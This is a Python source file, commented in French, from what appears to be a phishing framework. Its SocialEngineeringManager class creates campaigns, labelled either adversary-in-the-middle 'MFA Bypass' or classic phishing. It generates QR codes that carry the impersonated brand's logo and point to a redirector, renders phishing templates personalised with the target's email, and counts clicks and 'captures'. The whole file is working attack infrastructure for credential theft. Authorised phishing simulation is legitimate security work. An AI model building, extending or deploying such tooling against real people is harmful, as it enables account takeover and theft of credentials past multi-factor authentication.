import uuid
import time
import os
from typing import Dict, Optional, List
from core.social.templates import PhishingTemplate, TemplateLoader
from core.qr_link_system import QRLinkSystem, QRConfig
from core.common.config import get

from core.cache.redis_manager import redis_cache
import json

class SocialEngineeringManager:
    """
    Gestionnaire de campagnes d'ingénierie sociale.
    Orchestre la création de liens, le choix des templates et le suivi.
    """
    
    CAMPAIGN_TTL = 86400 * 7 # 7 jours
    
    def __init__(self):
        self.templates: Dict[str, PhishingTemplate] = TemplateLoader.load_all()
        self.qr_system = QRLinkSystem() 
        self.base_domain = get("BASE_DOMAIN") or "http://localhost:8000"

    def list_templates(self) -> List[Dict[str, str]]:
        return [{"id": k, "name": v.name, "description": v.description} for k, v in self.templates.items()]

    def _get_logo_path(self, template_id: str) -> Optional[str]:
        """
        Trouve le logo correspondant à un template.
        """
        # Base directory for logos
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        logo_dir = os.path.join(base_dir, "assets", "logos")
        
        # Mapping simple: template_id -> filename
        # On essaie d'abord le nom exact .png, puis .svg
        potential_names = [
            f"{template_id}.png",
            f"{template_id}.svg",
            f"{template_id}_logo.png"
        ]
        
        # Mapping spécifique pour certains cas
        special_mapping = {
            "twitter": "x.png", # X/Twitter modern branding
        }
        
        if template_id in special_mapping:
            potential_names.insert(0, special_mapping[template_id])
            
        for name in potential_names:
            path = os.path.join(logo_dir, name)
            if os.path.exists(path):
                return path
                
        return None

    def create_campaign(self, name: str, template_id: str, target_email: str = None, campaign_type: str = "aitm", use_logo: bool = True) -> Dict[str, str]:
        """
        Crée une nouvelle campagne de phishing.
        campaign_type: "aitm" (MFA Bypass) ou "template" (Classic Phishing)
        use_logo: Intégrer le logo de la cible dans le QR Code si possible.
        """
        if template_id not in self.templates:
            # Re-load templates just in case new ones were added
            self.templates = TemplateLoader.load_all()
            if template_id not in self.templates:
                raise ValueError(f"Template inconnue: {template_id}")
            
        campaign_id = str(uuid.uuid4())
        template = self.templates[template_id]
        
        # URL de redirection (pointe vers notre Smart Redirector)
        # Format: /v5/r/{campaign_id}
        redirect_url = f"{self.base_domain}/v5/r/{campaign_id}"
        
        # Configuration QR Code
        qr_config = QRConfig()
        if use_logo:
            # Tentative de trouver un logo correspondant au template
            logo_path = self._get_logo_path(template_id)
            if logo_path:
                qr_config.logo_path = logo_path
                # Ajuster l'échelle si nécessaire, par défaut 4
                qr_config.logo_scale_factor = 4

        # Génération du QR Code associé
        qr_filename = f"campaign_{campaign_id}.png"
        
        # Directory for QR codes: core/assets/qr_codes
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        qr_dir = os.path.join(base_dir, "assets", "qr_codes")
        
        if not os.path.exists(qr_dir):
            os.makedirs(qr_dir)
            
        full_qr_path = os.path.join(qr_dir, qr_filename)
        
        # Generate QR
        success, message = self.qr_system.generate_qr(redirect_url, full_qr_path, config=qr_config)
        
        if not success:
            print(f"[-] Failed to generate QR code for campaign {campaign_id}: {message}")
            # Fallback or continue without QR? Let's continue but log it.
        
        # URL path for frontend access
        qr_code_url = f"/assets/qr_codes/{qr_filename}"
        
        campaign_data = {
            "id": campaign_id,
            "name": name,
            "type": campaign_type,
            "template_id": template_id,
            "target_url": template.target_url,
            "target_email": target_email,
            "created_at": time.time(),
            "status": "active",
            "redirect_url": redirect_url,
            "qr_code_path": full_qr_path,
            "qr_code_url": qr_code_url,
            "metrics": {"clicks": 0, "captures": 0}
        }
        
        self._save_campaign(campaign_id, campaign_data)
        return campaign_data

    def get_campaign(self, campaign_id: str) -> Optional[Dict]:
        return redis_cache.get(f"campaign:{campaign_id}")

    def get_template_content(self, campaign_id: str) -> str:
        """
        Récupère le contenu HTML pour une campagne donnée.
        """
        campaign = self.get_campaign(campaign_id)
        if not campaign:
            return "<h1>Campaign Not Found</h1>"
            
        template = self.templates.get(campaign["template_id"])
        if template:
            context = {"company": "Target Company"}
            if campaign.get("target_email"):
                context["target_email"] = campaign["target_email"]
                # Also support 'email' for backward compatibility or generic templates
                context["email"] = campaign["target_email"]
            return template.render(context)
        return "<h1>Template Error</h1>"

    def _save_campaign(self, campaign_id: str, data: Dict):
        redis_cache.set(f"campaign:{campaign_id}", data, expire=self.CAMPAIGN_TTL)

# Instance globale
social_manager = SocialEngineeringManager()
